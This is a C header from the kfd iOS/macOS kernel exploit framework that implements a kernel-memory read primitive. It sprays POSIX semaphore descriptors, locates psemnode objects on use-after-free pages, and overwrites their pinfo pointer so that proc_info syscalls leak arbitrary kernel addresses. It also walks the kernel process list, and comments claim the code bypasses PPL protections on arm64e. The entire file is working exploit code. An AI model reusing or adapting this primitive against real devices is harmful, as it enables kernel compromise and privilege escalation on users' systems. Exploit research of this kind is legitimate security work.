/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef kread_sem_open_h
#define kread_sem_open_h

const char* kread_sem_open_name = "kfd-posix-semaphore";

u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr);
u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr);

/*
 * Helper: safely read a u64 from a PUAF page using vm_read_overwrite.
 * On arm64e PUAF pages may be PPL-owned and not directly readable.
 * Returns true on success.
 */
static inline bool puaf_read_u64(u64 uaddr, u64* out)
{
    vm_size_t bytes_read = 0;
    kern_return_t kr = vm_read_overwrite(mach_task_self(), uaddr, sizeof(u64),
                                         (vm_address_t)(out), &bytes_read);
    return (kr == KERN_SUCCESS && bytes_read == sizeof(u64));
}

/*
 * Helper: safely write a u64 to a PUAF page using vm_write.
 * Returns true on success.
 */
static inline bool puaf_write_u64(u64 uaddr, u64 value)
{
    kern_return_t kr = vm_write(mach_task_self(), uaddr,
                                (vm_offset_t)(&value), sizeof(u64));
    return (kr == KERN_SUCCESS);
}

void kread_sem_open_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
    kfd->kread.krkw_object_size = sizeof(struct psemnode);

    kfd->kread.krkw_method_data_size = ((kfd->kread.krkw_maximum_id + 1) * (sizeof(i32))) + sizeof(struct psem_fdinfo);
    kfd->kread.krkw_method_data = malloc_bzero(kfd->kread.krkw_method_data_size);

    sem_unlink(kread_sem_open_name);
    i32 sem_fd = (i32)(usize)(sem_open(kread_sem_open_name, (O_CREAT | O_EXCL), (S_IRUSR | S_IWUSR), 0));
    assert(sem_fd > 0);

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[kfd->kread.krkw_maximum_id] = sem_fd;

    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = sem_fd;
    u64 buffer = (u64)(sem_data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
}

void kread_sem_open_allocate(struct kfd* kfd, u64 id)
{
    i32 fd = (i32)(usize)(sem_open(kread_sem_open_name, 0, 0, 0));
    assert(fd > 0);

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[id] = fd;
}

bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);

    /*
     * On arm64e PUAF pages are PPL-owned and may not be directly accessible.
     * Use vm_read_overwrite to safely read pnode fields instead of direct
     * pointer dereference, which would crash with KERN_PROTECTION_FAILURE.
     */
    u64 pinfo0 = 0, pinfo1 = 0, pinfo2 = 0, pinfo3 = 0;
    u64 pad0 = 0, pad1 = 0, pad2 = 0, pad3 = 0;

    if (!puaf_read_u64(object_uaddr + 0 * sizeof(struct psemnode) + offsetof(struct psemnode, pinfo), &pinfo0)) return false;
    if (!puaf_read_u64(object_uaddr + 0 * sizeof(struct psemnode) + offsetof(struct psemnode, padding), &pad0)) return false;
    if (!puaf_read_u64(object_uaddr + 1 * sizeof(struct psemnode) + offsetof(struct psemnode, pinfo), &pinfo1)) return false;
    if (!puaf_read_u64(object_uaddr + 1 * sizeof(struct psemnode) + offsetof(struct psemnode, padding), &pad1)) return false;
    if (!puaf_read_u64(object_uaddr + 2 * sizeof(struct psemnode) + offsetof(struct psemnode, pinfo), &pinfo2)) return false;
    if (!puaf_read_u64(object_uaddr + 2 * sizeof(struct psemnode) + offsetof(struct psemnode, padding), &pad2)) return false;
    if (!puaf_read_u64(object_uaddr + 3 * sizeof(struct psemnode) + offsetof(struct psemnode, pinfo), &pinfo3)) return false;
    if (!puaf_read_u64(object_uaddr + 3 * sizeof(struct psemnode) + offsetof(struct psemnode, padding), &pad3)) return false;

    if ((pinfo0 > PAC_MASK) &&
        (pinfo0 != 0) &&
        (pinfo1 == pinfo0) &&
        (pinfo2 == pinfo0) &&
        (pinfo3 == pinfo0) &&
        (pad0 == 0) &&
        (pad1 == 0) &&
        (pad2 == 0) &&
        (pad3 == 0)) {
        for (u64 object_id = kfd->kread.krkw_searched_id; object_id < kfd->kread.krkw_allocated_id; object_id++) {
            struct psem_fdinfo data = {};
            i32 callnum = PROC_INFO_CALL_PIDFDINFO;
            i32 pid = kfd->info.env.pid;
            u32 flavor = PROC_PIDFDPSEMINFO;
            u64 arg = fds[object_id];
            u64 buffer = (u64)(&data);
            i32 buffersize = (i32)(sizeof(struct psem_fdinfo));

            const u64 shift_amount = 4;

            /*
             * Modify pinfo via vm_write (goes through kernel VM layer,
             * bypasses PPL pmap restrictions) instead of direct write.
             */
            u64 shifted_pinfo = pinfo0 + shift_amount;
            if (!puaf_write_u64(object_uaddr + offsetof(struct psemnode, pinfo), shifted_pinfo)) continue;

            assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

            puaf_write_u64(object_uaddr + offsetof(struct psemnode, pinfo), pinfo0);

            if (!memcmp(&data.pseminfo.psem_name[0], &sem_data->pseminfo.psem_name[shift_amount], 16)) {
                kfd->kread.krkw_object_id = object_id;
                return true;
            }
        }

        print_warning("failed to find modified psem_name sentinel");
    }

    return false;
}

void kread_sem_open_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kread_from_method(u64, kread_sem_open_kread_u64);
}

void kread_sem_open_find_proc(struct kfd* kfd)
{
    /*
     * Read pinfo from the PUAF page safely via vm_read_overwrite.
     */
    u64 pinfo = 0;
    if (!puaf_read_u64(kfd->kread.krkw_object_uaddr + offsetof(struct psemnode, pinfo), &pinfo)) return;

    /*
     * Strip PAC tag for arm64e — pinfo is a PAC-signed kernel pointer.
     */
    u64 pseminfo_kaddr = UNSIGN_PTR(pinfo);
    if (!pseminfo_kaddr) return;

    u64 semaphore_kaddr = static_kget(struct pseminfo, psem_semobject, pseminfo_kaddr);
    semaphore_kaddr = UNSIGN_PTR(semaphore_kaddr);
    if (!semaphore_kaddr) return;

    u64 task_kaddr = static_kget(struct semaphore, owner, semaphore_kaddr);
    task_kaddr = UNSIGN_PTR(task_kaddr);
    if (!task_kaddr) return;

    u64 proc_kaddr = task_kaddr - dynamic_info(proc__object_size);
    kfd->info.kaddr.kernel_proc = proc_kaddr;

    /*
     * Go backwards from kernel_proc to find our process.
     * Bounded loop to avoid infinite loop on corruption.
     */
    for (u64 iter = 0; iter < 1024; iter++) {
        i32 pid = dynamic_kget(proc__p_pid, proc_kaddr);
        if (pid == kfd->info.env.pid) {
            kfd->info.kaddr.current_proc = proc_kaddr;
            break;
        }

        u64 next = dynamic_kget(proc__p_list__le_prev, proc_kaddr);
        next = UNSIGN_PTR(next);
        if (!next || next == proc_kaddr) break;
        proc_kaddr = next;
    }
}

void kread_sem_open_deallocate(struct kfd* kfd, u64 id)
{
    return;
}

void kread_sem_open_free(struct kfd* kfd)
{
    kfd->kread.krkw_method_data = NULL;
}

/*
 * 64-bit kread function.
 * Uses vm_write to modify pinfo — bypasses PPL pmap restrictions on arm64e.
 */
u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];

    u64 old_pinfo = 0;
    puaf_read_u64(kfd->kread.krkw_object_uaddr + offsetof(struct psemnode, pinfo), &old_pinfo);

    u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_uid);
    puaf_write_u64(kfd->kread.krkw_object_uaddr + offsetof(struct psemnode, pinfo), new_pinfo);

    struct psem_fdinfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = kread_fd;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    puaf_write_u64(kfd->kread.krkw_object_uaddr + offsetof(struct psemnode, pinfo), old_pinfo);
    return *(u64*)(&data.pseminfo.psem_stat.vst_uid);
}

/*
 * 32-bit kread function.
 */
u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];

    u64 old_pinfo = 0;
    puaf_read_u64(kfd->kread.krkw_object_uaddr + offsetof(struct psemnode, pinfo), &old_pinfo);

    u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_usecount);
    puaf_write_u64(kfd->kread.krkw_object_uaddr + offsetof(struct psemnode, pinfo), new_pinfo);

    struct psem_fdinfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = kread_fd;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    puaf_write_u64(kfd->kread.krkw_object_uaddr + offsetof(struct psemnode, pinfo), old_pinfo);
    return *(u32*)(&data.pseminfo.psem_stat.vst_size);
}

#endif /* kread_sem_open_h */
